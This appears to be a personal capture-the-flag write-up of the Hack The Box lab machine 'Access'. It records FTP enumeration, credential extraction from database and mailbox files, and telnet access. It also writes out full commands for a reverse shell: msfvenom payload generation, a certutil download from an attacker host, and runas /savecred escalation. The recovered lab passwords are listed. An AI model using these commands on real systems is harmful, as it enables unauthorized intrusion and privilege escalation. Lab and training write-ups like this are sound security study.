# Enumeration 
`export ip=10.129.146.151`
`nmap -sC -sV -v $ip -oA nmap/init`


## open ports

```
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE 
|_http-title: MegaCorp
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### port 23
![[Pasted image 20230112182239.png]]

### Port 80
![[Pasted image 20230112182251.png]]



### Port 21

331 Anonymous access allowed, send identity (e-mail name) as password.
download all content inside ftp
`wget -m --no-passive ftp://anonympis:anonymous$ip`

![[Pasted image 20230112191219.png]]
archive is password protected
![[Pasted image 20230112192321.png]]


![[Pasted image 20230112182450.png]]
using mdbtools we can see what's inside the database file
```
mdb-tables backup.mdb

```
![[Pasted image 20230112191320.png]]
dumping table auth_user
`mdb-export auth_user`

![[Pasted image 20230112192149.png]]
Trying access4u@security and admin passwords on .zip file we found earlier
and access4u@security is valid

![[Pasted image 20230112192248.png]]

using readpst tool to read Acces Control.pst file
`readpst Access\ Control.pst`
now we get a readable .mbox file
`cat Access\ Control.mbox`

![[Pasted image 20230112193746.png]]
security:4Cc3ssC0ntr0ller trying to login using creds we found with telnet and we are in




# Foothold 

![[Pasted image 20230112194146.png]]

First let's get a better shell on the target using nishang reverse shell
![[Pasted image 20230112195433.png]]

# Privesc 

Uploading jaws to the target
`certutil -urlcache -f http://10.10.16.19/jaws.exe`

![[Pasted image 20230112202905.png]]

we can levrage that there is a stored administrator credentials and use it to run a reverse shell 
first we generate the shell and upload it to the target 

```
nc -lvnp 443 # start listener 

# generate payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.19 LPORT 4433 -f exe -o s.exe

certutil -urlcache -f http://10.10.16.19/s.exe s.exe # upload payload to the target
runas /savecred /user:ACCESS\Administrator "C:\Users\security\desktop\s.exe" # exploit
```
![[Pasted image 20230112203716.png]]
![[Pasted image 20230112204111.png]]

# Loot

Zip file creds:
	Password:access4u@security

telnet creds:
	Username:security
	Password:4Cc3ssC0ntr0ller


---
Tags: #ctf #HTB 
Resources: [Access](https://app.hackthebox.com/machines/156)
